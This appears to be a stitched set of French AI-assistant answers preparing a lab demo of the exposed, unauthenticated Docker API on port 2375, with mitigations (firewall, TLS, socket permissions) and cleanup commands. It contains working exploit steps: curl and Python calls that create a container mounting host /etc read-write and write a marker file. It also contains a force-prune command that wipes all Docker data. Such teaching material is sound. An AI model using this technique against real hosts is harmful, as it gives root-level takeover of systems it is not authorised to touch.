```
sudo iptables -A INPUT -p tcp --dport 2375 -j ACCEPT
```

**Ne pas exposer le démon sur une interface réseau publique.**

- Par défaut, binding sur l’Unix socket `unix:///var/run/docker.sock` suffit pour la gestion locale.
- Supprimer toute option `-H tcp://0.0.0.0:2375` ou équivalent dans systemd / docker-compose / options de démarrage.



# Mesures de mitigation — checklist prioritaire (à appliquer sur un hôte réel)

1. **Ne pas exposer le démon sur une interface réseau publique.**

   - Par défaut, binding sur l’Unix socket `unix:///var/run/docker.sock` suffit pour la gestion locale.
   - Supprimer toute option `-H tcp://0.0.0.0:2375` ou équivalent dans systemd / docker-compose / options de démarrage.

2. **Si un accès distant est nécessaire : activer TLS mutual (client cert) pour l’API Docker.**

   - Activer `--tlsverify --tlscacert=... --tlscert=... --tlskey=...` ou config équivalente dans `daemon.json`.
   - Générer une CA, signer certificats serveur et client ; configurer les clients pour vérifier le serveur.
   - Exemple conceptuel `daemon.json` (avec chemins de certificat, à adapter) :

   ```json
   {
     "hosts": ["unix:///var/run/docker.sock", "tcp://0.0.0.0:2376"],
     "tls": true,
     "tlsverify": true,
     "tlscacert": "/etc/docker/ca.pem",
     "tlscert": "/etc/docker/server-cert.pem",
     "tlskey": "/etc/docker/server-key.pem"
   }
   ```

   - Utiliser un port non-standard si besoin et documenter la raison.

3. **Restreindre l’accès réseau (pare-feu).**

   - Bloquer/filtrer le port 2375 (et 2376 si non chiffré) via iptables/ufw/ACL. Autoriser uniquement les IP de gestion requises.
   - Exemple conceptuel : `ufw deny 2375` ou règles iptables limitant source IP (défensif).

4. **Authentification & least privilege**

   - Privilégier l’accès via des outils qui n’exposent pas la socket Docker directement.
   - Utiliser des mécanismes d’authentification et rôles pour l’orchestration (Kubernetes RBAC, solutions de gestion cloud).

5. **Séparer les privilèges / rootless Docker**

   - Envisager `rootless mode` pour Docker où possible pour réduire l’impact d’une compromission du démon.

6. **Surveiller et auditer**

   - Déployer la journalisation des appels API Docker et la surveillance d’événements (création d’images conteneurs, montages de volumes sensibles).
   - Mettre en place détection d’anomalies réseau (port 2375 ouvert à partir d’adresses non autorisées).

7. **Patcher / mettre à jour**

   - Garder Docker à jour et appliquer les recommandations officielles de sécurité. Lien officiel : https://docs.docker.com/engine/security/protect-access/

------

### **1. Supprimer les conteneurs, réseaux et volumes du projet courant**

Depuis le dossier où se trouve ton `docker-compose.yml` :

```bash
docker compose down --volumes --rmi all
```

**Explication :**

- `down` : stoppe et supprime les conteneurs, réseaux, etc.
- `--volumes` : supprime aussi les volumes.
- `--rmi all` : supprime les images créées par ce `docker-compose`.

------

### **2. Supprimer \*tous\* les conteneurs, images, volumes et réseaux Docker (globalement)**

⚠️ Cette commande vide Docker **entièrement**, pas juste ton projet.

```bash
docker system prune -a --volumes -f
```

**Explication :**

- `-a` : supprime toutes les images, même non utilisées.
- `--volumes` : supprime aussi tous les volumes.
- `-f` : force sans confirmation.

------

### **3. Vérifier avant de supprimer (optionnel)**

Si tu veux voir ce qui va être supprimé :

```bash
docker system df
```

------

Souhaites-tu que je te fasse un petit script `cleanup.sh` qui fait tout ça proprement (avec des commentaires et confirmations étape par étape) ?



Parfait — ton plan est propre et pédagogique. Ci-dessous je te fournis, en français, tout ce dont tu as besoin pour **exécuter ta démo** et **appliquer / annuler** chacune des 4 mesures de mitigation que tu veux montrer :

1. retirer `privileged`, 2) supprimer l’exposition 2375, 3) firewall (ufw et iptables) pour défense en profondeur (+ commandes pour annuler), 4) restreindre l’accès local (forcer sudo / retirer du groupe docker). En fin de message je rappelle très brièvement la place des certificats TLS (tu peux renvoyer à la procédure détaillée si tu veux l’appliquer).

Je fais simple, concret et copiable-collable. Exécute les commandes en root (ou avec `sudo`) et garde des backups avant modification.

------

# A — Retirer `privileged` et enlever les mappings de ports (change dans docker-compose)

Avant :

```yaml
services:
  docker:
    build: .
    ports:
      - "2375:2375"
    privileged: true
```

Action manuelle recommandée (backup puis édition) :

```bash
# backup
cp docker-compose.yml docker-compose.yml.bak

# supprimer la ligne privileged: true et toute ligne '2375:2375'
# (commande sed simple, crée aussi un .bak)
sed -i.bak '/privileged:/d' docker-compose.yml
sed -i '/2375:2375/d' docker-compose.yml

# vérifier le fichier
cat docker-compose.yml
```

Relancer la stack (après vérif) :

```bash
docker compose down
docker compose up -d --build
```

Vérifier qu’il n’y a plus de publication hôte:

```bash
docker ps --filter "name=unauthorized-rce-docker-1" --format '{{.ID}}\t{{.Names}}\t{{.Ports}}'
ss -lntp | grep 2375 || echo "port 2375 non publié sur l'hôte"
```

------

# B — Bloquer le port 2375 (défense en profondeur)

## Avec UFW (simple, recommandé pour Debian/Ubuntu)

Activer UFW si nécessaire :

```bash
sudo ufw enable   # si pas déjà activé
```

Bloquer 2375 en entrée (IPv4/IPv6) :

```bash
sudo ufw deny in 2375/tcp
# vérifier
sudo ufw status numbered
```

Pour débloquer (si besoin) :

```bash
sudo ufw delete deny in 2375/tcp
```

## Avec iptables (plus bas-niveau)

Ajouter une règle REJECT (place en tête) :

```bash
# IPv4
sudo iptables -C INPUT -p tcp --dport 2375 -j REJECT 2>/dev/null || \
  sudo iptables -I INPUT -p tcp --dport 2375 -j REJECT

# vérifier
sudo iptables -L INPUT -n --line-numbers | grep 2375 || echo "no iptables 2375 rule"
```

Supprimer la règle (rollback) : on recherche la ligne puis on la supprime

```bash
# lister les lignes
sudo iptables -L INPUT --line-numbers -n

# supposer que la règle est en 1 (adapter le numéro)
sudo iptables -D INPUT 1
```

(Remarque : si tu utilises une politique iptables persistante, pense à sauvegarder/restore selon ta distro — `iptables-save` / `iptables-restore`.)

------

# C — Restreindre l’accès local à Docker (forcer sudo / retirer du groupe docker)

## 1) Afficher membres du groupe docker

```bash
getent group docker
```

## 2) Retirer un utilisateur (ex : `ing`) du groupe docker

```bash
sudo gpasswd -d ing docker
# vérifier
getent group docker
```

Ou pour retirer tout utilisateur non-administrateur listé automatiquement :

```bash
# affiche la liste puis supprime en connaissance de cause
getent group docker | awk -F: '{print $4}'
```

## 3) Forcer accès root pour docker en changeant owner du socket

Par défaut `/var/run/docker.sock` est `root:docker` 660. On peut forcer `root:root` pour interdire l'accès sans sudo.

```bash
# backup (optionnel)
sudo cp /var/run/docker.sock /var/run/docker.sock.bak 2>/dev/null || true

# appliquer
sudo chown root:root /var/run/docker.sock
sudo chmod 660 /var/run/docker.sock

# vérifier
ls -l /var/run/docker.sock
```

Après cela, tout utilisateur non-root (et non-membre du groupe qui possède le socket) ne pourra plus exécuter `docker` sans `sudo`.

## 4) Autoriser docker via sudo pour certains admins (optionnel, sécurisé)

Exemple : autoriser `adminuser` à exécuter docker via sudo sans mot de passe (adapter avec prudence) :

```bash
echo 'adminuser ALL=(ALL) NOPASSWD: /usr/bin/docker' | sudo tee /etc/sudoers.d/docker-admin
sudo chmod 440 /etc/sudoers.d/docker-admin
```

Pour tester :

```bash
sudo -l -U adminuser
# puis en tant qu'adminuser:
sudo docker ps
```

------

# D — Tester que la mitigation fonctionne (scénarios)

1. Test réseau (host) — doit refuser :

```bash
curl -sS http://localhost:2375/info || echo "Connexion refusée — mitigation réseau OK"
```

1. Test local non-privé (utilisateur non root) — doit obliger sudo :

```bash
# en tant qu'utilisateur normal
docker ps || echo "Docker require sudo or group membership — mitigation locale OK"
```

1. Test container IP : si l’attaquant sur l’hôte attaque l’IP 172.18.0.2 il peut encore parler au démon interne ; rappelle en diapo : **bloquer map hôte + restreindre accès local = meilleure défense**.

------

# E — Rétablir l’accès si tu veux tester à nouveau (undo rapide)

- UFW undo :

```bash
sudo ufw delete deny in 2375/tcp
```

- iptables undo : supprimer la ligne correspondante (voir `iptables -L --line-numbers` puis `iptables -D INPUT <num>`).
- Remettre le socket à `root:docker` (si tu veux que membres du groupe docker reprennent l’accès) :

```bash
sudo chown root:docker /var/run/docker.sock
sudo chmod 660 /var/run/docker.sock
```

- Réintégrer user au groupe docker :

```bash
sudo usermod -aG docker ing
# demande à l'utilisateur de se relogger pour que le groupe soit pris en compte
```

------

# F — TLS mutual auth — rappel (si accès distant strictement requis)

Tu as déjà voulu l’usage de TLS. Récapitulatif ultra-court pour ta slide (tu peux renvoyer au script complet si tu veux l’exécuter plus tard) :

- Générer CA, signer serveur et clients (openssl).
- Copier `ca.pem`, `server-cert.pem`, `server-key.pem` sur l’hôte (/etc/docker/certs).
- Lancer `dockerd` avec :
   `--tlsverify --tlscacert=/etc/docker/certs/ca.pem --tlscert=/etc/docker/certs/server-cert.pem --tlskey=/etc/docker/certs/server-key.pem --host=tcp://0.0.0.0:2376`
- Coté client : `DOCKER_TLS_VERIFY=1` + `DOCKER_CERT_PATH` pointant sur `ca.pem, cert.pem, key.pem` et se connecter sur `tcp://<host>:2376`.
- Pour la démo, binder sur `127.0.0.1:2376` et teler SSH si tu veux accès distant sans exposer le port publiquement.

Je peux te générer un `gen-certs.sh` et l’override systemd / docker-compose patch si tu veux l’appliquer après la démo.

------

# G — Texte prêt à dire/montrer dans ta diapo (justification)

Tu peux copier-coller ceci sur ta slide « justification » :

> « Bloquer le port 2375 via iptables/UFW est une mesure de défense en profondeur : elle ne corrige pas la mauvaise configuration (daemon exposé sans auth) mais empêche son exploitation directe depuis le réseau. Combinée à la suppression de `privileged`, au retrait des users non-administrateurs du groupe `docker` et à l’usage de TLS pour les accès distants, elle réduit fortement la probabilité d’une compromission complète. »

------

Si tu veux, je peux **générer maintenant** :

- 1. un petit script `apply_mitigations.sh` qui fait les étapes B + C (avec backups et prompts), **ou**
- 1. un script `revert_mitigations.sh` pour annuler facilement, **ou**
- 1. un script `gen-certs.sh` (TLS) + `override.conf` pour systemd (optionnel).

Dis lequel tu veux et je le crée tout de suite.







## 1. Structure générale de Docker

Docker repose sur **un modèle client/serveur** :

```
+------------------+
|   Docker CLI     |    →  Commandes : docker run, docker ps, docker build...
+------------------+
         |
         |  (API HTTP via socket UNIX ou TCP)
         v
+------------------+
|  Docker Daemon  |  ("dockerd") — le cerveau du système
|  - gère les images, conteneurs, volumes...
|  - communique avec le kernel via cgroups & namespaces
+------------------+
         |
         | (utilise le moteur de containerisation du système)
         v
+------------------+
|   Linux Kernel   |  (isolation, ressources, réseau, filesystem)
+------------------+
         |
         v
+------------------+
|  Containers      |  (processus isolés partageant le même kernel)
+------------------+
```

------

## 2. Rôle du Docker Daemon (`dockerd`)

Le **daemon** (`dockerd`) est un service système (souvent lancé en root) qui :

- écoute les **requêtes du client Docker** via une API REST ;
- crée, supprime, et configure les conteneurs ;
- télécharge les images depuis Docker Hub ;
- monte les volumes, configure le réseau, etc.

Par défaut, le client Docker et `dockerd` communiquent via un **socket UNIX local** :

```
/var/run/docker.sock
```

Mais il est possible (et parfois utile) de le configurer pour écouter sur un **port réseau TCP**, par exemple :

```
tcp://0.0.0.0:2375
```

Et c’est **ici que le problème de sécurité apparaît**.

------

## 3. Quand et pourquoi le daemon devient vulnérable

Le daemon Docker est **très puissant** : il tourne en root et peut manipuler les conteneurs et le système hôte.

Quand on l’expose sur le réseau :

```
dockerd --host=tcp://0.0.0.0:2375
```

… il devient **accessible à distance**.
 Si aucune authentification ni chiffrement (TLS) n’est configurée, **toute personne** capable de se connecter au port `2375` peut exécuter des requêtes Docker API comme :

- `POST /containers/create` → créer un conteneur ;
- `POST /containers/start` → démarrer le conteneur ;
- `GET /containers/json` → voir les conteneurs ;
- `DELETE /containers/<id>` → supprimer un conteneur.

C’est **équivalent à donner un accès root complet sur la machine hôte**.

------

## 4. Exemple de flux d’exploitation (en schéma ASCII)

```
Attaquant
   |
   |   1. Se connecte sur le port 2375 (non sécurisé)
   v
+-----------------------------+
|     Docker Daemon (root)    |
|  écoute sur 0.0.0.0:2375    |
+-------------+---------------+
              |
              | 2. L’attaquant envoie une requête API :
              |    "Créer un conteneur et monte /etc"
              v
        +---------------------+
        | Nouveau conteneur   |
        |  - Image alpine     |
        |  - /etc monté RW    |
        +---------------------+
              |
              | 3. Le conteneur modifie /etc/crontab
              v
        +---------------------+
        | Hôte compromis      |
        +---------------------+
```

------

## 5. En résumé

Tu peux dire quelque chose comme :

> Docker fonctionne avec un modèle client/serveur. Le client envoie des commandes à un démon appelé *dockerd*, qui s’exécute souvent avec les privilèges root.
>
> Par défaut, cette communication se fait en local via un socket UNIX, donc elle est sécurisée par les permissions du système.
>
> Mais si le daemon est configuré pour écouter sur une interface réseau (`tcp://0.0.0.0:2375`) sans authentification, alors n’importe qui sur le réseau peut utiliser l’API Docker à distance.
>
> Comme cette API permet de créer et d’exécuter des conteneurs, de monter des répertoires de l’hôte ou de modifier des fichiers systèmes, cela équivaut à une **prise de contrôle complète du serveur** — c’est une **vulnérabilité critique d’accès non autorisé**.

------



Ce schéma montre les éléments réseau (port 2375), les requêtes API impliquées, le conteneur malveillant (sanitisé) et le résultat observable sur l’hôte. J’ai volontairement gardé le payload **non dangereux** (marqueur), il illustre la preuve de concept sans ouvrir de reverse shell. N’oublie pas de préciser à l’oral que **tout ça doit être exécuté uniquement en labo contrôlé**.

------

ASCII — schéma complet de l’exploitation (avec ports, endpoints API, conteneur et résultat)

```basic
                          Attaquant (machine de test)
                          -------------------------
                                   |
                                   |  TCP:2375
                                   |  (HTTP -> Docker API)
                                   v
   +------------------------------------------------------------+
   |                       Réseau (LAN / Internet)              |
   +------------------------------------------------------------+
                                   |
                                   |  CONNECT: http://<VULN-IP>:2375
                                   v
                 +----------------------------------------+
                 |  Docker Daemon (dockerd)               |
                 |  - Écoute: unix:/var/run/docker.sock   |
                 |  - Écoute: tcp://0.0.0.0:2375         |
                 |  - S’exécute généralement en root     |
                 +-----------------+----------------------+
                                   |
                   1) POST /containers/create { JSON body }
                                   |
                                   |  (Image, Cmd, HostConfig.Binds)
                                   |
                                   v
                 +----------------------------------------+
                 |  Container (créé mais pas encore start)|
                 |  Image: alpine:latest                  |
                 |  Cmd: ["sh","-c","echo PROOF > /tmp/etc/pwned"]  <- SANITISED
                 |  HostConfig: { Binds: ["/etc:/tmp/etc:rw"] }     |
                 +-----------------+----------------------+
                                   |
                   2) POST /containers/{id}/start
                                   |
                                   v
                 +--------------------------------------------------+
                 |  Container démarré -> a accès à /tmp/etc (bind)  |
                 |  Exécute la commande qui écrit /tmp/etc/pwned    |
                 +-----------------+--------------------------------+
                                   |
                   3) Effet visible sur l’environnement du démon
                                   |
                                   v
                 +----------------------------------------+
                 |  Résultat (sur l’environnement contrôlé|
                 |  par le démon):                        |
                 |  - /etc/pwned  (ou /etc/pwned.txt)     |
                 |    contient "PROOF"                    |
                 |  - Cron / services peuvent aussi être  |
                 |    modifiés si l’attaquant écrit des   |
                 |    fichiers dans /tmp/etc/crontabs/*   |
                 +----------------------------------------+
```

Exemple **sanitisé** d’appel HTTP (conceptuel — à montrer à l’oral, ne pas exécuter en prod) :

```json
POST http://<VULN-IP>:2375/containers/create
Content-Type: application/json

{
  "Image": "alpine:latest",
  "Cmd": ["sh","-c","echo 'PROOF_OF_POC' > /tmp/etc/pwned"],
  "HostConfig": {
    "Binds": [ "/etc:/tmp/etc:rw" ]
  }
}
```

suivi de :

```shell
POST http://<VULN-IP>:2375/containers/<id>/start
```

Commentaires rapides (à dire pendant la démonstration)

- `dockerd` écoute sur **TCP:2375** sans TLS ni auth → toute requête HTTP valide est acceptée.
- L’API `/containers/create` permet de définir un `HostConfig.Binds` : l’attaquant peut monter des dossiers sensibles de l’hôte dans le conteneur.
- Une fois monté, le conteneur peut **écrire** dans ces répertoires. Ici on écrit un fichier `pwned` comme preuve, en situation réelle, un attaquant pourrait modifier des crontabs, remplacer des binaires, etc.
- D’où la gravité : exposer dockerd sans authentification équivaut à donner la clef (root) au réseau.

**Remarques de sécurité et pédagogiques (à afficher sur la diapositive)**

- Toujours préciser que la démonstration se fait en labo contrôlé et avec autorisation.
- Montrer la contre-mesure correspondante sur la slide suivante : retirer `--host=tcp://0.0.0.0:2375`, activer TLS, ou bloquer le port au firewall.
- Si tu veux, je peux fournir aussi la diapo suivante : “commandes safe pour vérifier l’accès” (curl /info, docker -H tcp://...), et une diapo “actions d’urgence (block port / stop service)”.



# Plan de démonstration (safe) — prouver que la vulnérabilité est exploitable en labo

Je te donne une séquence complète, pas-à-pas, pour ta présentation : commandes à lancer depuis la machine **attaquante** (toi en labo) et vérifications à faire côté **hôte vulnérable**. Tout est **non destructif** et n’ouvre pas de reverse shell, il prouve l’accès et la capacité d’écriture, ce qui suffit pour justifier la gravité. À la fin je fournis les éléments de preuve à capturer (logs, captures, sorties attendues) et un texte court pour les **speaker notes** de la diapo.

------

# 1) Préparation (avant la démo)

- Convenir que la démo est réalisée **uniquement en labo autorisé** par le prof.
- Identifie les IP :
  - `<VULN-IP>` = IP du conteneur/VM qui expose dockerd:2375.
  - `<ATTACKER-IP>` = ta machine de démonstration (pour captures, pas pour shell).
- Installe sur ta machine attaquante : `docker` client or `pip install docker`, `curl`, `jq`.
- Sur l’hôte vulnérable : avoir accès aux logs (ou demander au prof) ou exécuter les vérifs ensemble.

------

# 2) Preuve en lecture (confirme l’accès sans modifier)

Ces commandes montrent l’accès à l’API Docker.

Attaquant :

```bash
# version / info (lecture seule)
curl -sS http://<VULN-IP>:2375/version | jq .
curl -sS http://<VULN-IP>:2375/info | jq .
# lister conteneurs (lecture)
curl -sS http://<VULN-IP>:2375/containers/json | jq .
```

Éléments de preuve à capturer :

- Screenshot ou copie de la sortie de `curl .../info` montrant `OperatingSystem`, `ServerVersion`, `DockerRootDir`.
- Note l’horodatage (ou `date` avant la commande).

Speaker note : “Ici je montre que l’API Docker écoute sur 2375 et répond. Ces informations sont publiques via l’API — cela prouve un accès non authentifié.”

------

# 3) PoC safe : écrire un fichier marqueur dans `/etc` contrôlé par le daemon

**But** : si le démon est DIND isolé, le fichier peut être dans l’environnement du démon — c’est suffisant pour prouver la capacité d’écriture. Le payload est inoffensif : écrire un fichier `pwned.txt` contenant "PROOF".

Exécute depuis ta machine attaquante (ou depuis la machine qui peut joindre `<VULN-IP>`):

Option A — avec docker-py (Python) :

```python
# safe_poc.py
import docker
client = docker.DockerClient(base_url='http://<VULN-IP>:2375/')
client.containers.run(
    'alpine:latest',
    'sh -c "echo PROOF > /tmp/etc/pwned.txt"',
    remove=True,
    volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}}
)
print("PoC done — check /etc/pwned.txt on the environment controlled by the daemon")
```

Option B — via API `curl` (conceptuel) :

1. create

```bash
curl -s -X POST http://<VULN-IP>:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image":"alpine:latest",
    "Cmd":["sh","-c","echo PROOF > /tmp/etc/pwned.txt"],
    "HostConfig":{"Binds":["/etc:/tmp/etc:rw"]}
  }' | jq .
```

1. start (replace  with created container id)

```bash
curl -s -X POST http://<VULN-IP>:2375/containers/<id>/start
```

Éléments de preuve à capturer :

- Sortie JSON de la création (`id`), horodatée.
- Sortie de la commande `start`.
- Sur l’hôte : `cat /etc/pwned.txt` (ou `ls -l /etc/pwned.txt`) et capture écran montrant le contenu `PROOF`.
  - Si `dockerd` est DIND, montre où le fichier a été écrit (chemin indiqué par `DockerRootDir` dans `/info`) et affiche le fichier à ce chemin.
- Sur l’attaquant : copier les réponses HTTP et l’ID du container.

Speaker note : “J’ai créé un conteneur via l’API qui a monté `/etc` et écrit un fichier `pwned.txt`. La présence du fichier prouve qu’on peut écrire dans les espaces sensibles.”

------

# 4) Preuves supplémentaires (logs et événements) — renforcer la crédibilité

1. Docker events (sur l’hôte ou via API) :

   - Sur l’attaquant, tu peux récupérer les events récents :

   ```bash
   curl -sS "http://<VULN-IP>:2375/events?since=$(date +%s -d '-5 minutes')" | jq .
   ```

   - Capture l’événement `create`/`start` avec l’ID du container.

2. auditd (sur l’hôte) — si disponible :

   - Ajoute une règle temporaire **avant** la PoC (demande au prof ou exécute sur VM test) :

     ```bash
     sudo auditctl -w /etc -p wa -k etc_mod
     ```

   - Après la PoC, récupère les logs :

     ```bash
     sudo ausearch -k etc_mod -ts recent
     ```

   - Capture l’entrée montrant la modification de `/etc/pwned.txt`.

3. crond log (si tu veux démontrer persistance par cron) — **ne modifie pas cron en live** pour la démo sans autorisation.

4. tcpdump (facultatif) :

   - Capture la requête HTTP vers 2375 pour montrer qu’il s’agit d’un appel API non-auth :

     ```bash
     sudo tcpdump -i any tcp port 2375 -w dockerd-2375.pcap
     ```

   - Ouvre le pcap et montre les requêtes POST /containers/create.

Éléments de preuve à présenter :

- `docker events` JSON screenshot avec timestamps.
- auditd log lines montrant write to `/etc/pwned.txt`.
- tcpdump excerpt showing HTTP POST /containers/create (headers + payload snippet).

Speaker note : “Nous pouvons corréler la requête réseau vers 2375, l’événement Docker et la modification effective du fichier `/etc/pwned.txt` pour prouver la chaîne d’exploitation.”

------

# 5) Slide “Démonstration en direct” — script de la démo (ordre des actions pendant la présentation)

1. Afficher slide explicative (schéma ASCII déjà préparé).
2. Depuis l’attaquant : exécuter `curl http://<VULN-IP>:2375/info` → montrer sortie.
3. Lancer le PoC safe (Python) — montrer la commande et lancer.
4. Montrer `docker events` ou la sortie de `curl .../events` pour confirmer creation/start.
5. Sur l’hôte (ou via accès professor), afficher `cat /etc/pwned.txt` → montrer `PROOF`.
6. Afficher auditd / tcpdump traces si configurées.
7. Conclure : “Accès non-authentifié → création de conteneur → mount hôte → écriture fichier système = preuve de vulnérabilité critique.”

Speaker notes pour chaque étape (courtes) :

- Étape 2 : “Je montre l’accès en lecture — l’API répond sans auth.”
- Étape 3 : “Voici la requête pour créer un conteneur qui écrit un fichier marqueur.”
- Étape 4 : “On corrèle l’événement Docker avec l’ID du container.”
- Étape 5 : “La modification effective du fichier prouve le contrôle.”
- Étape 6 : “Les logs réseau et d’audit corroborent la chaîne d’attaque.”

------

# 6) Slide “Sécurité & Contre-mesures rapides” (à montrer juste après la démo)

Commandes rapides à afficher et à exécuter si tu veux montrer la remédiation :

- Bloquer l’accès réseau immédiatement (firewall) :

```bash
sudo iptables -I INPUT -p tcp --dport 2375 -j REJECT
```

- Ou arrêter le service dockerd dans le conteneur/repo (modifier entrypoint pour enlever `--host=tcp://0.0.0.0:2375` et redeployer).
- Mettre en place TLS pour dockerd si accès distant nécessaire (explique conceptuellement).

Speaker note : “Démontrer la remédiation renforce l’aspect pédagogique : montrer le problème puis la solution.”

------

# 7) Résultats attendus (exemples concrets à montrer dans la slide)

- `curl /info` → JSON avec `OperatingSystem`, `ServerVersion`.
- `curl /containers/create` → JSON contenant `"Id": "<container-id>"`
- docker events → JSON avec `action: "create"` and `action: "start"` and same container id.
- `cat /etc/pwned.txt` → `PROOF`
- auditd log showing write syscall to `/etc/pwned.txt`.

------

# 8) Aide pour préparer les captures (checklist)

- Avant la démo, vérifie les permissions et que les commandes sont autorisées en labo.
- Prépare des copies des sorties (`curl` → save to file), captures d’écran, et un pcap si tu veux analyser après.
- Prépare un plan B (slides statiques montrant les sorties attendues) si la démo en direct échoue.







# **Utilitaire**

### 1) Liste rapide des conteneurs lancés par compose

(utile pour récupérer le nom / l’ID du conteneur)

```bash
# si tu utilises docker compose v2 (commande recommandée)
docker compose ps

# ou la version « classique »
docker-compose ps

# sortie utile : colonne NAME / SERVICE / STATE / PORTS
```

------

### 2) Obtenir l’ID du conteneur pour un service donné

Remplace `<service>` par le nom du service dans ton `docker-compose.yml` (par ex. `docker` d’après ce repo).

```bash
# retourne l'ID du conteneur pour le service nommé
docker compose ps -q <service>
# ex :
docker compose ps -q docker
```

------

### 3) Récupérer l’IP du conteneur (méthode directe)

Remplace `<container-id>` par l’ID obtenu ci-dessus.

```bash
# méthode courte (inspect + template)
docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' <container-id>

# ou la sortie complète (plus d'infos)
docker inspect <container-id> | jq '.[0].NetworkSettings.Networks'
```

Exemple de sortie courte : `172.18.0.2`

------

### 4) Voir l’IP depuis le réseau Docker (utile si plusieurs réseaux)

Liste les réseaux créés par compose puis inspecte le réseau :

```bash
docker network ls
# repère le réseau créé (généralement nommé <folder>_default)

docker network inspect <network-name> | jq '.[0].Containers'
# ou sans jq pour lecture brute :
docker network inspect <network-name>
```

Tu verras tous les conteneurs attachés et leurs IPs.

------

### 5) Vérifier l’IP *depuis l’intérieur* du conteneur

Si tu peux exécuter une commande dans le conteneur :

```bash
docker exec -it <container-id> sh -c "ip addr show"
# ou
docker exec -it <container-id> sh -c "hostname -I || ip -4 addr show eth0"
```

------

### 6) Si tu veux l’IP utilisée pour exposer le port 2375 (host → container)

Souvent `docker compose` mappe le port du conteneur au host. Pour savoir quel port host est mappé :

```bash
docker port <container-id>
# par ex : 2375/tcp -> 0.0.0.0:2375
```

Pour voir si le service écoute sur l’hôte (utile pour se connecter depuis ta machine) :

```bash
ss -lntp | grep 2375
# ou
sudo netstat -lntp | grep 2375
```

Si tu vois `0.0.0.0:2375` ou `127.0.0.1:2375` ça te dit sur quelle interface le port est exposé.

------

### 7) Récapitulatif rapide (commandes à coller)

```bash
# 1) voir conteneurs créés
docker compose ps

# 2) obtenir id du service (ex: service "docker")
CID=$(docker compose ps -q docker)

# 3) afficher ip du conteneur
docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' $CID

# 4) voir mapping de ports
docker port $CID

# 5) (option) inspecter le réseau
docker network inspect $(docker network ls --filter name=$(basename $(pwd)) -q)
```



------

## 1) Vérifier d’abord ce que voit le démon (info)

Pour comprendre la topologie, regarde les champs `OperatingSystem` et `DockerRootDir` du démon :

```bash
curl -sS http://172.18.0.2:2375/info | jq '.OperatingSystem, .DockerRootDir'
```

- Si `OperatingSystem` contient le nom d’une distribution “inside container” (ou fait apparaître `docker`), c’est que le démon tourne dans un conteneur DIND.
- `DockerRootDir` te donne le répertoire racine du stockage Docker vu par ce démon (ex: `/var/lib/docker`), utile pour localiser les fichiers.

Capture cette sortie pour la slide.

------

## 2) Méthode A — Lire le fichier via le même démon (recommandé, simple)

Crée via l’API un conteneur qui va **lire** le fichier `/etc/pwned.txt` tel qu’il est vu par le démon et renvoyer son contenu dans les logs. Exemple avec `curl` (copy/paste) :

1. Création (remplace `<payload>` si besoin) :

```bash
curl -s -X POST http://172.18.0.2:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image":"alpine:latest",
    "Cmd":["sh","-c","cat /tmp/etc/pwned.txt || echo NOT_FOUND"],
    "HostConfig":{ "Binds":[ "/etc:/tmp/etc:ro" ] }
  }' | jq .
```

Cette requête renverra un JSON contenant `"Id": "<container-id>"`.

1. Démarrer le container (remplace `<id>` par l’Id retourné) :

```bash
curl -s -X POST http://172.18.0.2:2375/containers/<id>/start
```

1. Récupérer les logs (output du `cat`) :

```bash
curl -s "http://172.18.0.2:2375/containers/<id>/logs?stdout=1&stderr=1" 
```

- Si le marqueur est présent, tu verras `PROOF_OF_POC`.
- Si non, `NOT_FOUND` ou rien.

C’est la façon la plus directe et pédagogique : on prouve que **le démon peut lire/écrire** dans ce `/etc` qu’il contrôle.

------

## 3) Méthode B — Avec docker-py (équivalent Python)

Tu peux faire la même lecture avec le script Python si tu préfères :

```python
import docker
c = docker.DockerClient(base_url='http://172.18.0.2:2375/')
container = c.containers.create('alpine:latest',
                                ['sh','-c','cat /tmp/etc/pwned.txt || echo NOT_FOUND'],
                                host_config=c.api.create_host_config(binds={'/etc': {'bind': '/tmp/etc', 'mode': 'ro'}}))
c.api.start(container.id)
logs = c.api.logs(container.id, stdout=True, stderr=True)
print(logs.decode())
```

(Remarque : utilises `docker-py` import et API selon ta version.)

------

## 4) Méthode C — Si tu veux inspecter depuis la machine hôte réelle

Si tu préfères accéder directement au container DIND (le conteneur qui exécute `dockerd`) depuis la machine hôte réelle (là où tu as `docker` qui gère les conteneurs), fais :

1. Identifie le conteneur DIND sur l’hôte (ex: `docker compose ps` puis `docker ps`), trouve son ID (par ex `3ae` précédemment).
2. Exécute un shell dans ce conteneur DIND et regarde `/etc` :

```bash
docker exec -it <dind-container-id> sh -c "ls -l /etc/pwned.txt && cat /etc/pwned.txt || echo NOT_FOUND"
```

Si le démon tourne dans ce conteneur DIND, ce `/etc` est probablement celui qui a été monté et modifié par le PoC.

------

## 5) Vérifier les événements Docker pour corrélation (preuve)

Pour corréler la création/start du conteneur que tu as lancé avec l’écriture du fichier :

```bash
curl -s "http://172.18.0.2:2375/events?since=$(date +%s -d '-5 minutes')" | jq .
```

Cherche l’événement `create`/`start` et l’`id` du container : cela lie la requête HTTP au changement observé.

------

## 6) Pourquoi `ls /etc/pwned.txt` sur ta machine n’a rien donné

- Tu as regardé le `/etc` **de ta machine hôte** (ou de la VM où tu tapes la commande).
- Le démon `172.18.0.2` est **un autre environnement** (probablement un daemon DIND dans un conteneur). Le bind `/etc:/tmp/etc` monté par le démon concerne le `/etc` visible **par ce démon**, pas forcément celui de ta machine interactive.
- Conclusion : le PoC a très probablement réussi *dans l’espace contrôlé par le démon*, mais pas dans le `/etc` local que tu inspectais.

------

## Proposition d’actions immédiates (faites maintenant pour la démo)

1. Exécute :

```bash
curl -sS http://172.18.0.2:2375/info | jq '.OperatingSystem, .DockerRootDir'
```

Colle la sortie ici si tu veux que je l’analyse.

1. Lis le marqueur via l’API (méthode recommandée) — copie/colle le JSON retourné par la `create` pour que je te guide sur la commande `logs` si tu as besoin.
2. Optionnel : si tu veux que je te génère la commande `curl` exacte et prête à coller (avec ID automatique via `jq`) pour faire create -> start -> logs en une ligne, je te la fournis tout de suite.

------

# 1) Est-ce vraiment une vulnérabilité si le démon est dans un conteneur (DIND) ?

**Oui**, et voici pourquoi en deux cas :

- **Cas : dockerd exposé dans un conteneur (DIND) mais isolé**
